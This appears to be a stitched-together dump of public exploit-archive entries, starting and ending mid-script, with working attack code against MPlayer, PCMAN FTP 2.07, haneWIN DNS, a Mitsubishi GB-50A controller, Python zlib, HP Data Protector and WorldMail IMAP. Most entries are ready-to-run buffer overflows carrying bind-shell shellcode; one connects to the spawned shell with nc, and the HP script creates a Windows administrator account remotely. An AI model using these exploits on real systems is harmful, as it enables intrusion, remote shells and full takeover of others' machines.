"\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x32\x50\x4f\x44\x34\x4e\x52"
"\x43\x59\x4d\x48\x4c\x47\x4a\x53\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
"\x44\x37\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x54\x4f\x4f"
"\x48\x4d\x4b\x35\x47\x45\x44\x45\x41\x55\x41\x35\x41\x45\x4c\x36"
"\x41\x30\x41\x55\x41\x35\x45\x45\x41\x35\x4f\x4f\x42\x4d\x4a\x56"
"\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x36"
"\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x48\x47\x55\x4e\x4f"
"\x43\x48\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
"\x4a\x36\x42\x4f\x4c\x48\x46\x30\x4f\x45\x43\x35\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a"

)



End_url ='.jpg;false;0;300;200;90)'

# create a socket object called 'c' 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# connect to the socket 
c.connect((host, port)) 

Request = (Start_url + Junk_buffer + Jump_esp + Shell_code + End_url)

# create a file-like object to read 
fileobj = c.makefile('r', 0) 

# Ask the server for the file 
fileobj.write("GET /"+Request+" HTTP/1.1\n\n") 

# milw0rm.com [2009-04-01]
source: http://www.securityfocus.com/bid/27499/info

MPlayer is prone to a remote code-execution vulnerability because it fails to sanitize certain 'MOV' file tags before using them to index heap memory.

An attacker can exploit this issue to execute arbitrary code, which can result in the complete compromise of the computer. Failed exploit attempts will result in a denial-of-service condition.

This issue affects MPlayer 1.0rc2; other versions may also be affected. 

#!/bin/python

import struct
import sys

def mkatom(type,data):
     if len(type) != 4:
         raise "type must by of length 4!!!"
     mov = ""
     mov += struct.pack(">L",len(data)+8)
     mov += type
     mov += data
     return mov

def poc(address, block_size):

     what=struct.pack(">L", 0x41414141) * 2 # Writes an 8 bytes chunk
     base= ((address - 8) / block_size) +1

     ftyp = mkatom("ftyp","3gp4"+"\x00\x00\x02\x00"+"3gp4"+"3gp33gp23gp1")
     mdat = mkatom("mdat","MALDAAAAAD!")
     stsc  = mkatom("stsc",struct.pack(">L",1) + \
                     struct.pack(">L",2) + \
                     struct.pack(">L",base) + \
                     what + \
                     struct.pack(">L",base+300)+what)
     trak = mkatom("trak",stsc)
     moov = mkatom("moov",trak)

     file = ftyp + mdat + moov
     return file

try:
     if sys.argv[2] != "linux":
         evilness = poc(0x0122e000, 24)     #Windows XP SP2 Prof. ES
     else:
         evilness = poc(0x088aa020, 20)     #Linux Gentoo

     print "[+] Generating file: %s" % sys.argv[1]
     file = open(sys.argv[1], "wb")
     file.write(evilness)
     file.close()
     print "[+] Done."

except Exception, e:
     print "[+] Usage: python mplayer_poc.py filename.mov windows (For
WinXP Prof SP2 ES)"
     print "           python mplayer_poc.py filename.mov linux     (For
Linux Gentoo)"

     
# Exploit Title: PCMAN FTP 2.07 ABOR Command Buffer Overflow
# Date: Jan 25,2014
# Exploit Author: Mahmod Mahajna (Mahy)
# Version: 2.07
# Tested on: Windows 7 sp1 x64 (english)
# Email: m.dofo123@gmail.com
import socket as s
from sys import argv
#
if(len(argv) != 4):
    print "USAGE: %s host <user> <password>" % argv[0]
    exit(1)
else:
    #store command line arguments
    script,host,fuser,fpass=argv
    #vars
    junk = '\x41' * 2011 #overwrite function (ABOR) with garbage/junk chars
    espaddress = '\x59\x06\xbb\x76' # 76BB0659
    nops = '\x90' * 10
    shellcode = ( # BIND SHELL | PORT 4444
        "\x31\xc9\xdb\xcd\xbb\xb3\x93\x96\x9d\xb1\x56\xd9\x74\x24\xf4"
        "\x5a\x31\x5a\x17\x83\xea\xfc\x03\x5a\x13\x51\x66\x6a\x75\x1c"
        "\x89\x93\x86\x7e\x03\x76\xb7\xac\x77\xf2\xea\x60\xf3\x56\x07"
        "\x0b\x51\x43\x9c\x79\x7e\x64\x15\x37\x58\x4b\xa6\xf6\x64\x07"
        "\x64\x99\x18\x5a\xb9\x79\x20\x95\xcc\x78\x65\xc8\x3f\x28\x3e"
        "\x86\x92\xdc\x4b\xda\x2e\xdd\x9b\x50\x0e\xa5\x9e\xa7\xfb\x1f"
        "\xa0\xf7\x54\x14\xea\xef\xdf\x72\xcb\x0e\x33\x61\x37\x58\x38"
        "\x51\xc3\x5b\xe8\xa8\x2c\x6a\xd4\x66\x13\x42\xd9\x77\x53\x65"
        "\x02\x02\xaf\x95\xbf\x14\x74\xe7\x1b\x91\x69\x4f\xef\x01\x4a"
        "\x71\x3c\xd7\x19\x7d\x89\x9c\x46\x62\x0c\x71\xfd\x9e\x85\x74"
        "\xd2\x16\xdd\x52\xf6\x73\x85\xfb\xaf\xd9\x68\x04\xaf\x86\xd5"
        "\xa0\xbb\x25\x01\xd2\xe1\x21\xe6\xe8\x19\xb2\x60\x7b\x69\x80"
        "\x2f\xd7\xe5\xa8\xb8\xf1\xf2\xcf\x92\x45\x6c\x2e\x1d\xb5\xa4"
        "\xf5\x49\xe5\xde\xdc\xf1\x6e\x1f\xe0\x27\x20\x4f\x4e\x98\x80"
        "\x3f\x2e\x48\x68\x2a\xa1\xb7\x88\x55\x6b\xce\x8f\x9b\x4f\x82"
        "\x67\xde\x6f\x34\x2b\x57\x89\x5c\xc3\x31\x01\xc9\x21\x66\x9a"
        "\x6e\x5a\x4c\xb6\x27\xcc\xd8\xd0\xf0\xf3\xd8\xf6\x52\x58\x70"
        "\x91\x20\xb2\x45\x80\x36\x9f\xed\xcb\x0e\x77\x67\xa2\xdd\xe6"
        "\x78\xef\xb6\x8b\xeb\x74\x47\xc2\x17\x23\x10\x83\xe6\x3a\xf4"
        "\x39\x50\x95\xeb\xc0\x04\xde\xa8\x1e\xf5\xe1\x31\xd3\x41\xc6"
        "\x21\x2d\x49\x42\x16\xe1\x1c\x1c\xc0\x47\xf7\xee\xba\x11\xa4"
        "\xb8\x2a\xe4\x86\x7a\x2d\xe9\xc2\x0c\xd1\x5b\xbb\x48\xed\x53"
        "\x2b\x5d\x96\x8e\xcb\xa2\x4d\x0b\xfb\xe8\xcc\x3d\x94\xb4\x84"
        "\x7c\xf9\x46\x73\x42\x04\xc5\x76\x3a\xf3\xd5\xf2\x3f\xbf\x51"
        "\xee\x4d\xd0\x37\x10\xe2\xd1\x1d\x1a\xcd")
    sploit = junk+espaddress+nops+shellcode
    #create socket
    conn = s.socket(s.AF_INET,s.SOCK_STREAM)
    #establish connection to server
    conn.connect((host,21))
    #post ftp user
    conn.send('USER '+fuser+'\r\n')
    #wait for response
    uf = conn.recv(1024)
    #post ftp password
    conn.send('PASS '+fpass+'\r\n')
    #wait for response
    pf = conn.recv(1024)
    #send ftp command with sploit
    conn.send('ABOR '+sploit+'\r\n')
    cf = conn.recv(1024)
    #close connection
    conn.close()
    
    
	
# Exploit Title: PCMAN FTP 2.07 CWD Command Buffer Overflow
# Date: Jan 25,2014
# Exploit Author: Mahmod Mahajna (Mahy)
# Version: 2.07
# Tested on: Windows 7 sp1 x64 (english)
# Email: m.dofo123@gmail.com
import socket as s
from sys import argv
#
if(len(argv) != 4):
    print "USAGE: %s host <user> <password>" % argv[0]
    exit(1)
else:
    #store command line arguments
    script,host,fuser,fpass=argv
    #vars
    junk = '\x41' * 2012 #overwrite function (CWD) with garbage/junk chars
    espaddress = '\x59\x06\xbb\x76' # 76BB0659
    nops = '\x90' * 10
    shellcode = ( # BIND SHELL | PORT 4444
        "\x31\xc9\xdb\xcd\xbb\xb3\x93\x96\x9d\xb1\x56\xd9\x74\x24\xf4"
        "\x5a\x31\x5a\x17\x83\xea\xfc\x03\x5a\x13\x51\x66\x6a\x75\x1c"
        "\x89\x93\x86\x7e\x03\x76\xb7\xac\x77\xf2\xea\x60\xf3\x56\x07"
        "\x0b\x51\x43\x9c\x79\x7e\x64\x15\x37\x58\x4b\xa6\xf6\x64\x07"
        "\x64\x99\x18\x5a\xb9\x79\x20\x95\xcc\x78\x65\xc8\x3f\x28\x3e"
        "\x86\x92\xdc\x4b\xda\x2e\xdd\x9b\x50\x0e\xa5\x9e\xa7\xfb\x1f"
        "\xa0\xf7\x54\x14\xea\xef\xdf\x72\xcb\x0e\x33\x61\x37\x58\x38"
        "\x51\xc3\x5b\xe8\xa8\x2c\x6a\xd4\x66\x13\x42\xd9\x77\x53\x65"
        "\x02\x02\xaf\x95\xbf\x14\x74\xe7\x1b\x91\x69\x4f\xef\x01\x4a"
        "\x71\x3c\xd7\x19\x7d\x89\x9c\x46\x62\x0c\x71\xfd\x9e\x85\x74"
        "\xd2\x16\xdd\x52\xf6\x73\x85\xfb\xaf\xd9\x68\x04\xaf\x86\xd5"
        "\xa0\xbb\x25\x01\xd2\xe1\x21\xe6\xe8\x19\xb2\x60\x7b\x69\x80"
        "\x2f\xd7\xe5\xa8\xb8\xf1\xf2\xcf\x92\x45\x6c\x2e\x1d\xb5\xa4"
        "\xf5\x49\xe5\xde\xdc\xf1\x6e\x1f\xe0\x27\x20\x4f\x4e\x98\x80"
        "\x3f\x2e\x48\x68\x2a\xa1\xb7\x88\x55\x6b\xce\x8f\x9b\x4f\x82"
        "\x67\xde\x6f\x34\x2b\x57\x89\x5c\xc3\x31\x01\xc9\x21\x66\x9a"
        "\x6e\x5a\x4c\xb6\x27\xcc\xd8\xd0\xf0\xf3\xd8\xf6\x52\x58\x70"
        "\x91\x20\xb2\x45\x80\x36\x9f\xed\xcb\x0e\x77\x67\xa2\xdd\xe6"
        "\x78\xef\xb6\x8b\xeb\x74\x47\xc2\x17\x23\x10\x83\xe6\x3a\xf4"
        "\x39\x50\x95\xeb\xc0\x04\xde\xa8\x1e\xf5\xe1\x31\xd3\x41\xc6"
        "\x21\x2d\x49\x42\x16\xe1\x1c\x1c\xc0\x47\xf7\xee\xba\x11\xa4"
        "\xb8\x2a\xe4\x86\x7a\x2d\xe9\xc2\x0c\xd1\x5b\xbb\x48\xed\x53"
        "\x2b\x5d\x96\x8e\xcb\xa2\x4d\x0b\xfb\xe8\xcc\x3d\x94\xb4\x84"
        "\x7c\xf9\x46\x73\x42\x04\xc5\x76\x3a\xf3\xd5\xf2\x3f\xbf\x51"
        "\xee\x4d\xd0\x37\x10\xe2\xd1\x1d\x1a\xcd")
    sploit = junk+espaddress+nops+shellcode
    #create socket
    conn = s.socket(s.AF_INET,s.SOCK_STREAM)
    #establish connection to server
    conn.connect((host,21))
    #post ftp user
    conn.send('USER '+fuser+'\r\n')
    #wait for response
    uf = conn.recv(1024)
    #post ftp password
    conn.send('PASS '+fpass+'\r\n')
    #wait for response
    pf = conn.recv(1024)
    #send ftp command with sploit
    conn.send('CWD '+sploit+'\r\n')
    cf = conn.recv(1024)
    #close connection
    conn.close()
    
    
	
#!/usr/bin/python
 
# Exploit Title: haneWIN DNS Server (SEH)
# Author: Dario Estrada (dash) https://intrusionlabs.org
# Date: 2014-01-29
# Version: haneWIN DNS Server 1.5.3
# Vendor Homepage: http://www.hanewin.net/
# Vulnerable app link:http://www.hanewin.net/dns-e.htm
# Tested on: Windows XP SP3
# Thanks to God, to my family and all my friends for always being there
#
# Description:
# A SEH overflow occurs when large amount of data is sent to the server 
#
import socket, sys, os, time
 
usage = "\n  Usage: " + sys.argv[0] + " <host> \n"
 
if len(sys.argv) < 2:
    print usage
    sys.exit(0)
 
host = sys.argv[1]

shellcode = (
#msfpayload windows/shell_bind_tcp R | msfencode -t c -b '\x00\xff\x0a\x0d'
"\xb8\xdf\x64\x04\x29\xd9\xc7\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x56\x31\x45\x13\x83\xed\xfc\x03\x45\xd0\x86\xf1\xd5\x06\xcf"
"\xfa\x25\xd6\xb0\x73\xc0\xe7\xe2\xe0\x80\x55\x33\x62\xc4\x55"
"\xb8\x26\xfd\xee\xcc\xee\xf2\x47\x7a\xc9\x3d\x58\x4a\xd5\x92"
"\x9a\xcc\xa9\xe8\xce\x2e\x93\x22\x03\x2e\xd4\x5f\xeb\x62\x8d"
"\x14\x59\x93\xba\x69\x61\x92\x6c\xe6\xd9\xec\x09\x39\xad\x46"
"\x13\x6a\x1d\xdc\x5b\x92\x16\xba\x7b\xa3\xfb\xd8\x40\xea\x70"
"\x2a\x32\xed\x50\x62\xbb\xdf\x9c\x29\x82\xef\x11\x33\xc2\xc8"
"\xc9\x46\x38\x2b\x74\x51\xfb\x51\xa2\xd4\x1e\xf1\x21\x4e\xfb"
"\x03\xe6\x09\x88\x08\x43\x5d\xd6\x0c\x52\xb2\x6c\x28\xdf\x35"
"\xa3\xb8\x9b\x11\x67\xe0\x78\x3b\x3e\x4c\x2f\x44\x20\x28\x90"
"\xe0\x2a\xdb\xc5\x93\x70\xb4\x2a\xae\x8a\x44\x24\xb9\xf9\x76"
"\xeb\x11\x96\x3a\x64\xbc\x61\x3c\x5f\x78\xfd\xc3\x5f\x79\xd7"
"\x07\x0b\x29\x4f\xa1\x33\xa2\x8f\x4e\xe6\x65\xc0\xe0\x58\xc6"
"\xb0\x40\x08\xae\xda\x4e\x77\xce\xe4\x84\x0e\xc8\x2a\xfc\x43"
"\xbf\x4e\x02\x72\x63\xc6\xe4\x1e\x8b\x8e\xbf\xb6\x69\xf5\x77"
"\x21\x91\xdf\x2b\xfa\x05\x57\x22\x3c\x29\x68\x60\x6f\x86\xc0"
"\xe3\xfb\xc4\xd4\x12\xfc\xc0\x7c\x5c\xc5\x83\xf7\x30\x84\x32"
"\x07\x19\x7e\xd6\x9a\xc6\x7e\x91\x86\x50\x29\xf6\x79\xa9\xbf"
"\xea\x20\x03\xdd\xf6\xb5\x6c\x65\x2d\x06\x72\x64\xa0\x32\x50"
"\x76\x7c\xba\xdc\x22\xd0\xed\x8a\x9c\x96\x47\x7d\x76\x41\x3b"
"\xd7\x1e\x14\x77\xe8\x58\x19\x52\x9e\x84\xa8\x0b\xe7\xbb\x05"
"\xdc\xef\xc4\x7b\x7c\x0f\x1f\x38\x8c\x5a\x3d\x69\x05\x03\xd4"
"\x2b\x48\xb4\x03\x6f\x75\x37\xa1\x10\x82\x27\xc0\x15\xce\xef"
"\x39\x64\x5f\x9a\x3d\xdb\x60\x8f"
)

nSEH = '\xeb\x06\x90\x90'
SEH = '\xd1\x07\xfc\x7f'
opcode = "\xe9\xdf\xf6\xff\xff"
junk = 'A' * (2324 - len(shellcode))
padding = 'A' * 600

buff = shellcode + junk + nSEH + SEH + opcode + padding

print "[+] Connecting to %s:53" % (host)
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, 53))
	aix= shellcode + 'A' * (2324 - len(shellcode)) 
	print "[*] Sending payload.." + " shellcode: " + str(len(shellcode))
	s.send(buff)
	print "[*] Exploit Sent Successfully!"
	s.close()
    	print "[+] Waiting for 5 sec before spawning shell to " + host + ":4444\r"
    	time.sleep(5)
	os.system ("nc -n " + host + " 4444")
except:	
	print "[!] Could not connect to " + host + ":53\r"
        sys.exit(0)
source: http://www.securityfocus.com/bid/28406/info

The Mitsubishi Electric GB-50A is prone to multiple authentication-bypass vulnerabilities.

Successful exploits will allow unauthorized attackers to gain access to administrative functionality and completely compromise vulnerable devices; other attacks are also possible. 

# you can get BeautifulSoup from:
# http://www.crummy.com/software/BeautifulSoup/#Download
from BeautifulSoup import BeautifulSoup
from httplib import HTTPConnection
import sys

ip = sys.argv[1]
template = '<Mnet Group="%%s" Drive="%s" />' % sys.argv[2].upper()

def post(data):
    c = HTTPConnection(ip)
    c.request('POST','/servlet/MIMEReceiveServlet',data,{'content-type':'text/xml'})
    return BeautifulSoup(c.getresponse().read())
    
# first out what groups there are
soup = post("""
<?xml version="1.0" encoding="UTF-8"?>
<Packet>
 <Command>getRequest</Command>
 <DatabaseManager>
  <ControlGroup>
   <MnetList/>
  </ControlGroup>
 </DatabaseManager>
</Packet>
""")
group_nums = [(g['group']) for g in soup.findAll('mnetrecord')]
# now go through and set all the on/off bits to what we were told
soup = post("""
<?xml version="1.0" encoding="UTF-8"?>
<Packet>
 <Command>setRequest</Command>
 <DatabaseManager>
%s
 </DatabaseManager>
</Packet>
""" % ('\n'.join([template%g for g in group_nums])))

source: http://www.securityfocus.com/bid/28715/info

Python zlib module is prone to a remote buffer-overflow vulnerability because the library fails to properly sanitize user-supplied data.

An attacker can exploit this issue to execute arbitrary code with the privileges of the user running an application that relies on the affected library. Failed exploit attempts will result in a denial-of-service condition.

This issue affects Python 2.5.2; other versions may also be vulnerable. 

python-2.5.2-zlib-unflush-misallocation.py
------------------------------------------
#!/usr/bin/python

import zlib

msg = """
Desire to know why, and how, curiosity; such as is in no living creature
        but man:
so that man is distinguished, not only by his reason, but also by this
        singular passion
from other animals; in whom the appetite of food, and other pleasures of
        sense, by
predominance, take away the care of knowing causes; which is a lust of
        the mind,
that by a perseverance of delight in the continual and indefatigable
generation of knowledge, exceedeth the short vehemence of any carnal
        pleasure.
"""

compMsg = zlib.compress(msg)
bad = -24
decompObj = zlib.decompressobj()
decompObj.decompress(compMsg)
decompObj.flush(bad)

	
python-2.5.2-zlib-unflush-signedness.py:
----------------------------------------
#!/usr/bin/python

import zlib

msg = """
Society in every state is a blessing, but government even in its best
        state is but a necessary evil
in its worst state an intolerable one; for when we suffer, or are
        exposed to the same miseries by a
government, which we might expect in a country without government, our
        calamities is heightened by
reflecting that we furnish the means by which we suffer! Government,
        like dress, is the badge of
lost innocence; the palaces of kings are built on the ruins of the
        bowers of paradise. For were
the impulses of conscience clear, uniform, and irresistibly obeyed, man
        would need no other
lawgiver; but that not being the case, he finds it necessary to
        surrender up a part of his property
to furnish means for the protection of the rest; and this he is induced
        to do by the same prudence which
in every other case advises him out of two evils to choose the least.
        Wherefore, security being the true
design and end of government, it unanswerably follows that whatever form
        thereof appears most likely to
ensure it to us, with the least expense and greatest benefit, is
        preferable to all others.
""" * 1024

compMsg = zlib.compress(msg)
bad = -2
decompObj = zlib.decompressobj()
decompObj.decompress(compMsg, 1)
decompObj.flush(bad)import argparse
import socket

"""
Exploit Title: HP Data Protector EXEC_BAR Remote Command Execution
Exploit Author: Chris Graham @cgrahamseven
CVE: CVE-2013-2347
Date: February 14, 2014
Vendor Homepage: www.hp.com
Version: 6.10, 6.11, 6.20 
Tested On: Windows Server 2003, Windows Server 2008 R2
References: 
https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03822422
http://www.zerodayinitiative.com/advisories/ZDI-14-008/
Details:

The omniinet service, which runs by default on port 5555, is susceptible
to numerous remotely exploitable vulnerabilities. By sending a malicious
EXEC_BAR packet (opcode 11), a remote attacker can force the omniinet
service to run an arbitrary command. On Windows, the omniinet service is
running as SYSTEM. This allows for complete compromise of the remote
host. 

To exploit this vulnerability, you only need to send two specific arguments. 
Omniinet has an argument parser that will extract these out and 
eventually pass them to a call to CreateProcessW via the lpCommandLine 
parameter. 

When a packet is sent to the omniinet service, it will check the opcode
and look up an associated function to call based on the opcode in a table
of function pointers. The function to handle EXEC_BAR packets requires that
the packet contain at least 19 arguments. The 18th argument will be the
command we want to execute, and the 19th will be an argument we can pass to 
the command we are executing. This exploit will create a new windows account 
and add it to the local Administrators group. This means that lpCommandLine 
that gets passed to CreateProcess will need to look like:

'c:\windows\system32\cmd.exe' '/c net user usr p@ss!23 /add'
and
'c:\windows\system32\cmd.exe' '/c net localgroup Administrators usr /add'

Note: The 19th value has size constraints so it needs to be as short of a 
string as possible. 
"""

exec_bar_add_user = \
"\x00\x00\x01\x3c\xff\xfe\x32\x00\x00\x00\x20\x00\x68\x00\x70\x00" + \
"\x64\x00\x70\x00\x31\x00\x00\x00\x20\x00\x30\x00\x00\x00\x20\x00" + \
"\x00\x00\x20\x00\x00\x00\x20\x00\x45\x00\x4e\x00\x55\x00\x00\x00" + \
"\x20\x00\x31\x00\x31\x00\x00\x00\x20\x00\x45\x00\x58\x00\x45\x00" + \
"\x43\x00\x5f\x00\x42\x00\x41\x00\x52\x00\x00\x00\x20\x00\x41\x00" + \
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00" + \
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00" + \
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00" + \
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00" + \
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00" + \
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00" + \
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00" + \
"\x41\x00\x00\x00\x20\x00\x63\x00\x3a\x00\x5c\x00\x77\x00\x69\x00" + \
"\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x73\x00\x79\x00" + \
"\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x63\x00" + \
"\x6d\x00\x64\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x20\x00" + \
"\x00\x00\x20\x00\x2f\x00\x63\x00\x20\x00\x6e\x00\x65\x00\x74\x00" + \
"\x20\x00\x75\x00\x73\x00\x65\x00\x72\x00\x20\x00\x75\x00\x73\x00" + \
"\x72\x00\x20\x00\x70\x00\x40\x00\x73\x00\x73\x00\x21\x00\x32\x00" + \
"\x33\x00\x20\x00\x2f\x00\x61\x00\x64\x00\x64\x00\x00\x00\x00\x00"

exec_bar_make_admin = \
"\x00\x00\x01\x56\xff\xfe\x32\x00\x00\x00\x20\x00\x68\x00\x70\x00" + \
"\x64\x00\x70\x00\x31\x00\x00\x00\x20\x00\x30\x00\x00\x00\x20\x00" + \
"\x00\x00\x20\x00\x00\x00\x20\x00\x45\x00\x4e\x00\x55\x00\x00\x00" + \
"\x20\x00\x31\x00\x31\x00\x00\x00\x20\x00\x45\x00\x58\x00\x45\x00" + \
"\x43\x00\x5f\x00\x42\x00\x41\x00\x52\x00\x00\x00\x20\x00\x41\x00" + \
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00" + \
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00" + \
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00" + \
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00" + \
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00" + \
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00" + \
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00" + \
"\x41\x00\x00\x00\x20\x00\x63\x00\x3a\x00\x5c\x00\x77\x00\x69\x00" + \
"\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x73\x00\x79\x00" + \
"\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x63\x00" + \
"\x6d\x00\x64\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x20\x00" + \
"\x00\x00\x20\x00\x2f\x00\x63\x00\x20\x00\x6e\x00\x65\x00\x74\x00" + \
"\x20\x00\x6c\x00\x6f\x00\x63\x00\x61\x00\x6c\x00\x67\x00\x72\x00" + \
"\x6f\x00\x75\x00\x70\x00\x20\x00\x41\x00\x64\x00\x6d\x00\x69\x00" + \
"\x6e\x00\x69\x00\x73\x00\x74\x00\x72\x00\x61\x00\x74\x00\x6f\x00" + \
"\x72\x00\x73\x00\x20\x00\x75\x00\x73\x00\x72\x00\x20\x00\x2f\x00" + \
"\x61\x00\x64\x00\x64\x00\x00\x00\x00\x00"

def connect_target(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as err:
        print "[-]ERROR CREATING SOCKET! CODE: %d MSG: %s" % (err[0], err[1]) 
        return -1
    try:
        sock.connect((target, port))
    except socket.error as err:
        print "[-]ERROR CONNECTING TO TARGET! CODE: %d MSG: %s" % (err[0], err[1])
        return -1
    return sock

def send_recv_packet(sock, packet):
    sock.sendall(packet)
    res = sock.recv(4096)
    return res

cmdline_parser = argparse.ArgumentParser(description='HP Data Protector EXEC_BAR Remote Command Execution')
cmdline_parser.add_argument('-t', dest='ip', help='Target host ip', required=True)
cmdline_parser.add_argument('-p', dest='port', help='Target port', default=5555, type=int, required=False)
args = cmdline_parser.parse_args()

print "\n[*]ATTEMPING TO ADD WINDOWS ADMINISTRATOR ACCOUNT usr WITH PASSWORD p@ss!23"
for packet in [exec_bar_add_user, exec_bar_make_admin]:
    target = connect_target(args.ip, args.port)
    if target == -1: exit()
    data = send_recv_packet(target, packet)
    print "[*]SERVER RESPONSE: " + \
    data.split("\xFF\xFE\x31\x00\x35\x00\x00\x00\x20\x00")[1].lstrip("\x07\x00\x01\x00").rstrip("$")
    target.close()

#!/usr/bin/python
# Tested on 6.1.19.0

import sys,socket
 



banner = """
   
####################################################################################
###                                                                              ###
###        Coded by: Muhammad EL Harmeel    m.harmeel(at)gmail(dot)com           ###
###                                                                              ###
####################################################################################

*************************************************************************************  
* Details:                                                                          *
*                                                                                   *
* - PRE AUTHENTICATION Eudora Qualcomm WorldMail 9.0.333.0 IMAPd Service            *
*   Preauthentication Buffer Overflow.                                              *
* - Tested on: Windows Server 2003 SP1.                                             *
* - SEH gets overwritten at 749 bytes when using UID command.                       *
* Only 79 bytes left after SEH, So the shellcode was placed before SEH              *
* and backward jump is used after SEH to execute the shellcode.                     *
* - Shellcode: shell_bind_tcp LPORT*4444 EXITFUNC*seh , Bad charcters are 0x00 0x7b *
*************************************************************************************

"""


print banner



if len(sys.argv)!=3:
        banner()
        print "\nUsage: ./worldmail_uid.py <IP> <PORT>\n"
        sys.exit(0)




egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7" # this is the marker/tag: w00t

shellcode = "w00tw00t" + ("\xb8\x3b\xe5\xd0\x36\xda\xd3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x56\x31\x42\x13\x83\xc2\x04\x03\x42\x34\x07\x25\xca\xa2\x4e"
"\xc6\x33\x32\x31\x4e\xd6\x03\x63\x34\x92\x31\xb3\x3e\xf6\xb9"
"\x38\x12\xe3\x4a\x4c\xbb\x04\xfb\xfb\x9d\x2b\xfc\xcd\x21\xe7"
"\x3e\x4f\xde\xfa\x12\xaf\xdf\x34\x67\xae\x18\x28\x87\xe2\xf1"
"\x26\x35\x13\x75\x7a\x85\x12\x59\xf0\xb5\x6c\xdc\xc7\x41\xc7"
"\xdf\x17\xf9\x5c\x97\x8f\x72\x3a\x08\xb1\x57\x58\x74\xf8\xdc"
"\xab\x0e\xfb\x34\xe2\xef\xcd\x78\xa9\xd1\xe1\x75\xb3\x16\xc5"
"\x65\xc6\x6c\x35\x18\xd1\xb6\x47\xc6\x54\x2b\xef\x8d\xcf\x8f"
"\x11\x42\x89\x44\x1d\x2f\xdd\x03\x02\xae\x32\x38\x3e\x3b\xb5"
"\xef\xb6\x7f\x92\x2b\x92\x24\xbb\x6a\x7e\x8b\xc4\x6d\x26\x74"
"\x61\xe5\xc5\x61\x13\xa4\x81\x46\x2e\x57\x52\xc0\x39\x24\x60"
"\x4f\x92\xa2\xc8\x18\x3c\x34\x2e\x33\xf8\xaa\xd1\xbb\xf9\xe3"
"\x15\xef\xa9\x9b\xbc\x8f\x21\x5c\x40\x5a\xe5\x0c\xee\x34\x46"
"\xfd\x4e\xe4\x2e\x17\x41\xdb\x4f\x18\x8b\x6a\x48\xd6\xef\x3f"
"\x3f\x1b\x10\xae\xe3\x92\xf6\xba\x0b\xf3\xa1\x52\xee\x20\x7a"
"\xc5\x11\x03\xd6\x5e\x86\x1b\x30\x58\xa9\x9b\x16\xcb\x06\x33"
"\xf1\x9f\x44\x80\xe0\xa0\x40\xa0\x6b\x99\x03\x3a\x02\x68\xb5"
"\x3b\x0f\x1a\x56\xa9\xd4\xda\x11\xd2\x42\x8d\x76\x24\x9b\x5b"
"\x6b\x1f\x35\x79\x76\xf9\x7e\x39\xad\x3a\x80\xc0\x20\x06\xa6"
"\xd2\xfc\x87\xe2\x86\x50\xde\xbc\x70\x17\x88\x0e\x2a\xc1\x67"
"\xd9\xba\x94\x4b\xda\xbc\x98\x81\xac\x20\x28\x7c\xe9\x5f\x85"
"\xe8\xfd\x18\xfb\x88\x02\xf3\xbf\xb7\xf3\xc9\x55\x2f\xaa\xb8"
"\x17\x2d\x4d\x17\x5b\x48\xce\x9d\x24\xaf\xce\xd4\x21\xeb\x48"
"\x05\x58\x64\x3d\x29\xcf\x85\x14")


buffer   = "A" * 292                    #Junk
buffer  +=  shellcode                   #Shellcode of 368 bytes to spawn a shell listening on port 4444 
buffer  += "\x90" *81                   #Nop Sled to fill the rest of the buffer after the shellcode 
buffer  += "\xEB\x06\x90\x90"           #Short JMP of 6 bytes.
buffer  += "\x95\xcb\x0d\x60"           #Memory Address of POP POP RETN sequence at module MsccMgr.dll @ windows server 2003.
buffer  += egghunter                    #Egg hunter to search for the tag "w00tw00t" and executes the code after it
buffer  += "}" *32                      #Junk



